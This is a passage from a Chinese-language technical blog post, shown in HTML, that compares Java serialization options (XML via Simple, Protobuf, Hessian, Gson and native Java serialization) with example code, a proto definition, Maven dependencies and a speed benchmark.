class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"type\">Gson</span> <span class=\"variable\">gson</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">GsonBuilder</span>().create();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">whh</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"string\">&quot;password&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        save(whh, <span class=\"string\">&quot;person.xml&quot;</span>);</span><br><span class=\"line\">        System.out.println(load(<span class=\"string\">&quot;person.xml&quot;</span>));<span class=\"comment\">//Person&#123;name=&#x27;null&#x27;, age=1, password=&#x27;password&#x27;&#125;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Persister</span> <span class=\"variable\">persister</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Persister</span>();</span><br><span class=\"line\">        persister.write(person, <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(filePath));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Persister</span>().read(Person.class, <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(filePath));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>序列化后的xml如下：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">person</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">age</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">age</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>password<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">person</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当然在使用xml序列化的时候也可以对输出的数据进行序列化。</p>\n<h4 id=\"其他序列化框架\"><a href=\"#其他序列化框架\" class=\"headerlink\" title=\"其他序列化框架\"></a>其他序列化框架</h4><p>第三方格式的序列化框架还有Protobuf、Thrift、Marshalling、Hessian，这些框架在序列化速度和序列化后文件大小通常比较出众。<br>Protobuf使用比较麻烦：<br>1、下载 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9wcm90b2J1Zi9yZWxlYXNlcy8=\">protoc<i class=\"fa fa-external-link-alt\"></i></span><br>2、先用通过proto文件定义模板<br>3、通过定义的proto模板生成java文件<br>4、序列化反序列化</p>\n<p>proto文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//proto版本</span><br><span class=\"line\">syntax = &quot;proto3&quot;;</span><br><span class=\"line\">package com.whh.netty;</span><br><span class=\"line\">//输出后所在包</span><br><span class=\"line\">option java_package = &quot;com.whh.netty&quot;;</span><br><span class=\"line\">//输出后文件名</span><br><span class=\"line\">option java_outer_classname = &quot;PersonVo&quot;;</span><br><span class=\"line\">//消息名，不能和文件名相同</span><br><span class=\"line\">message Person&#123;</span><br><span class=\"line\">    string name = 1;</span><br><span class=\"line\">    int32 age = 2;</span><br><span class=\"line\">    string password = 3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过命令<code>./protoc -I=/Users/xxxx/src/main/java --java_out=/Users/xxxx/src/main/java /xxxx/src/main/java/com/whh/netty/person.proto</code>生成PersonVo类，在写java_out时需要注意的是如果有输出包，不需要写包名，会自动生成包路径。<br>详情查看：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vcHJvdG9jb2wtYnVmZmVycy9kb2NzL2phdmF0dXRvcmlhbA==\">Protocol Buffer Basics: Java<i class=\"fa fa-external-link-alt\"></i></span><br>maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.google.protobuf<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>protobuf-java<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.5.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        PersonVo.<span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> PersonVo.Person.newBuilder()</span><br><span class=\"line\">                .setName(<span class=\"string\">&quot;whh&quot;</span>)</span><br><span class=\"line\">                .setAge(<span class=\"number\">1</span>)</span><br><span class=\"line\">                .setPassword(<span class=\"string\">&quot;psw&quot;</span>).build();</span><br><span class=\"line\">        save(person, <span class=\"string\">&quot;person.out&quot;</span>);</span><br><span class=\"line\">        PersonVo.<span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;person.out&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化前：&quot;</span> + person);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化后：&quot;</span> + load);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(PersonVo.Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">FileOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath);</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            person.writeTo(outputStream);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> PersonVo.Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">FileInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath);</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> PersonVo.Person.parseFrom(inputStream);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码中对生成的对象进行序列化以及反序列化，生成的对象文件比较大，不进行展示。生成的person.out文件12kb相对java默认序列化生成的文件很小。</p>\n<ul>\n<li>在使用maven依赖jar时，需要使用的版本和之前下载的<code>protoc</code>版本保持一致，避免出错。</li>\n</ul>\n<p>thrift参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly90aHJpZnQuYXBhY2hlLm9yZy90dXRvcmlhbC9qYXZh\">Java Tutorial<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>Marshalling一般用在JBoss里面，外面用的相对较少</p>\n<p>Hessian使用：<br>maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.caucho<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>hessian<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.0.38<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, Integer age, String password)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Person&#123;&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;, age=&quot;</span> + age +</span><br><span class=\"line\">                <span class=\"string\">&quot;, password=&#x27;&quot;</span> + password + <span class=\"string\">&#x27;\\&#x27;&#x27;</span> +</span><br><span class=\"line\">                <span class=\"string\">&#x27;&#125;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"number\">1</span>, <span class=\"string\">&quot;pwd&quot;</span>);</span><br><span class=\"line\">        save(person, <span class=\"string\">&quot;person.out&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">load</span> <span class=\"operator\">=</span> load(<span class=\"string\">&quot;person.out&quot;</span>);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化前：&quot;</span> + person);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;反序列化后：&quot;</span> + load);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">save</span><span class=\"params\">(Person person, String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">FileOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(filePath);</span><br><span class=\"line\"></span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"type\">Hessian2Output</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Hessian2Output</span>(outputStream);</span><br><span class=\"line\">            output.writeObject(person);</span><br><span class=\"line\">            output.close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//反序列化</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">load</span><span class=\"params\">(String filePath)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                <span class=\"type\">FileInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(filePath);</span><br><span class=\"line\">        ) &#123;</span><br><span class=\"line\">            <span class=\"type\">Hessian2Input</span> <span class=\"variable\">input</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Hessian2Input</span>(inputStream);</span><br><span class=\"line\">            <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> (Person) input.readObject(Person.class);</span><br><span class=\"line\">            input.close();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> person;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用Hessian时也需要实现接口Serializable。<br>Hessian在序列化结构简单的类时速度非常快，但是在序列化结构特别复杂类时效率下降比较明显。</p>\n<p>上述几种序列化框架各有优缺点，Protobuf、Thrift、Hessian与语言无关，当如果修改文件结构后需要重新生成新文件，序列化速度非常快，非常适合异构系统。java自带序列化只能使用java语言，序列化较慢，生成序列化文件较大。Json、xml序列化后文本易读，但是速度相对前面两种较慢。</p>\n<p>此处各种序列化只是简单写的例子，各自还有很多功能未展示。</p>\n<h4 id=\"序列化速度比较\"><a href=\"#序列化速度比较\" class=\"headerlink\" title=\"序列化速度比较\"></a>序列化速度比较</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer age;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String password;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Date birthday;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer gender;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String addr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">Person</span><span class=\"params\">(String name, Integer age, String password, Date birthday, Integer gender, String addr)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.password = password;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.birthday = birthday;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.gender = gender;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.addr = addr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;whh&quot;</span>, <span class=\"number\">1</span>, <span class=\"string\">&quot;pwd&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(), <span class=\"number\">1</span>, <span class=\"string\">&quot;湖北&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Instant</span> <span class=\"variable\">time</span> <span class=\"operator\">=</span> Instant.now();</span><br><span class=\"line\">        <span class=\"type\">Timestamp</span> <span class=\"variable\">timestamp</span> <span class=\"operator\">=</span> Timestamp.newBuilder().setSeconds(time.getEpochSecond())</span><br><span class=\"line\">                .setNanos(time.getNano()).build();</span><br><span class=\"line\">        PersonVo.<span class=\"type\">Person</span> <span class=\"variable\">person1</span> <span class=\"operator\">=</span> PersonVo.Person.newBuilder()</span><br><span class=\"line\">                .setName(<span class=\"string\">&quot;whh&quot;</span>)</span><br><span class=\"line\">                .setAge(<span class=\"number\">1</span>)</span><br><span class=\"line\">                .setPassword(<span class=\"string\">&quot;pwd&quot;</span>)</span><br><span class=\"line\">                .setBirthday(timestamp)</span><br><span class=\"line\">                .setGender(<span class=\"number\">1</span>)</span><br><span class=\"line\">                .setAddr(<span class=\"string\">&quot;湖北&quot;</span>).build();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = hessianSave(person, <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">personLoad</span> <span class=\"operator\">=</span> hessianLoad(<span class=\"number\">1000000</span>, bytes);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;耗时：&quot;</span> + (System.currentTimeMillis() - start));</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;大小：&quot;</span> + (bytes.length));</span><br><span class=\"line\">        System.out.println(personLoad);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">byte</span>[] javaSave(Person person, <span class=\"type\">int</span> num) <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                    <span class=\"type\">ByteArrayOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>(<span class=\"number\">1024</span>);</span><br><span class=\"line\">                    <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">objectOutputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>(outputStream);</span><br><span class=\"line\">            ) &#123;</span><br><span class=\"line\">                objectOutputStream.writeObject(person);</span><br><span class=\"line\">                bytes = outputStream.toByteArray();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">javaLoad</span><span class=\"params\">(<span class=\"type\">int</span> num, <span class=\"type\">byte</span>[] bytes)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span> (<span class=\"type\">ByteArrayInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayInputStream</span>(bytes);) &#123;</span><br><span class=\"line\">                person = (Person) <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>(inputStream).readObject();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> person;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">byte</span>[] gsonSave(Person person, <span class=\"type\">int</span> num) <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Gson</span> <span class=\"variable\">gson</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">GsonBuilder</span>().create();</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> gson.toJson(person);</span><br><span class=\"line\">            bytes = str.getBytes();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">gsonLoad</span><span class=\"params\">(<span class=\"type\">int</span> num, <span class=\"type\">byte</span>[] bytes)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">Gson</span> <span class=\"variable\">gson</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">GsonBuilder</span>().create();</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            person = gson.fromJson(<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(bytes), Person.class);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> person;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">byte</span>[] protoSave(PersonVo.Person person, <span class=\"type\">int</span> num) <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                    <span class=\"type\">ByteArrayOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>(<span class=\"number\">1024</span>);</span><br><span class=\"line\">            ) &#123;</span><br><span class=\"line\">                person.writeTo(outputStream);</span><br><span class=\"line\">                bytes = outputStream.toByteArray();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> PersonVo.Person <span class=\"title function_\">protoLoad</span><span class=\"params\">(<span class=\"type\">int</span> num, <span class=\"type\">byte</span>[] bytes)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        PersonVo.<span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">            person = PersonVo.Person.parseFrom(bytes);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> person;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"type\">byte</span>[] hessianSave(Person person, <span class=\"type\">int</span> num) <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] bytes = <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> (</span><br><span class=\"line\">                    <span class=\"type\">ByteArrayOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayOutputStream</span>(<span class=\"number\">1024</span>);</span><br><span class=\"line\">            ) &#123;</span><br><span class=\"line\">                <span class=\"type\">Hessian2Output</span> <span class=\"variable\">output</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Hessian2Output</span>(outputStream);</span><br><span class=\"line\">                output.writeObject(person);</span><br><span class=\"line\">                output.close();</span><br><span class=\"line\">                bytes = outputStream.toByteArray();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Person <span class=\"title function_\">hessianLoad</span><span class=\"params\">(<span class=\"type\">int</span> num, <span class=\"type\">byte</span>[]bytes)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">Person</span> <span class=\"variable\">person</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; num; i++) &#123;</span><br><span class=\"line\">            person = (Person) <span class=\"keyword\">new</span> <span class=\"title class_\">Hessian2Input</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayInputStream</span>(bytes)).readObject(Person.class);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> person;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">syntax = &quot;proto3&quot;;</span><br><span class=\"line\">import public &quot;google/protobuf/timestamp.proto&quot;;</span><br><span class=\"line\">package com.whh.netty;</span><br><span class=\"line\"></span><br><span class=\"line\">option java_package = &quot;com.whh.netty&quot;;</span><br><span class=\"line\">option java_outer_classname = &quot;PersonVo&quot;;</span><br><span class=\"line\">message Person&#123;</span><br><span class=\"line\">    string name = 1;</span><br><span class=\"line\">    int32 age = 2;</span><br><span class=\"line\">    string password = 3;</span><br><span class=\"line\">    google.protobuf.Timestamp 